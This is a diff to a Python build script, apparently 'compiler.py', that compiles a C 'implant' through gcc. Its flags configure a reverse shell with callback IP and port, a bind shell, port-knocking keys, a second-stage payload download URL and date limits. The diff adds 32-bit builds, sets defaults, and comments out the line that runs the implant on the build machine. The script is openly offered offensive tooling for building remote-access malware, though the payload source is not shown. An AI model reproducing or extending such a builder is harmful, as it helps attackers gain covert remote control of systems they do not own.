@@ -15,14 +15,17 @@ import os.path as filesys
 
 
 # The path(s) to all of the .c and .h files to be included in the implant
-implant_c_path = "../client/url2file.c"
+implant_c_path = "testing.c"
 
 # Available implant compiler choices
+# TODO: Update this line in argparser to match the currently available options
 parser = argparse.ArgumentParser(
     "python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip] [-]')
 
 parser.add_argument("-o", "--outputName", type=str, metavar='',
                     help="output filename", default="implant")
+parser.add_argument("-32", "--compile32", action="store_true",
+                    help="compile for a 32bit system")
 
 ##### Targeting #####
 parser.add_argument("-ip", "--ipAddress", type=str,
@@ -58,9 +61,9 @@ parser.add_argument("-atkB", "--bindShell", type=int, metavar='',
 parser.add_argument("-atkR", "--reverseShell", action="store_true",
                     help="run a reverse shell")
 parser.add_argument("-revip", "--reverseIP", type=str, metavar='',
-                    help="reverse shell callback IP")
+                    help="reverse shell callback IP", default="unknown")
 parser.add_argument("-revport", "--reversePort", type=str, metavar='',
-                    help="reverse shell Port")
+                    help="reverse shell Port", default="unknown")
 parser.add_argument("-url", "--downloadURL", type=str, metavar='', default="www.example.com",
                     help="url to get second stage downloaded (or lovely pictures of cookies)")
 
@@ -95,6 +98,8 @@ cmdString = ["gcc", implant_c_path, "-o", args.outputName]
 ##### Simple Details #####
 if args.ipAddress != "unknown":
     cmdString.insert(1, "-D IPNUM=\"" + (args.ipAddress) + "\"")
+if args.compile32:
+    cmdString.insert(1, "-m32")
 
 ##### Attacks #####
 if args.reverseIP != "unknown":
@@ -131,6 +136,7 @@ if args.enddate != "unknown":
 if args.debug:
     cmdString.insert(1, "-D DEBUG")
 
+print(cmdString)
 
 # Execute the gcc string to compile the implant
 subprocess.run(cmdString)
@@ -138,7 +144,7 @@ subprocess.run(cmdString)
 # Run the new implant
 # FOR TESTING ONLY
 # TODO: REMOVE THIS RUNNER SO YOU DON'T EXPLOIT YOURSELF
-subprocess.run("./" + args.outputName)
+# subprocess.run("./" + args.outputName)
 
 # Run the valgrind test if required
 if args.valgrind:
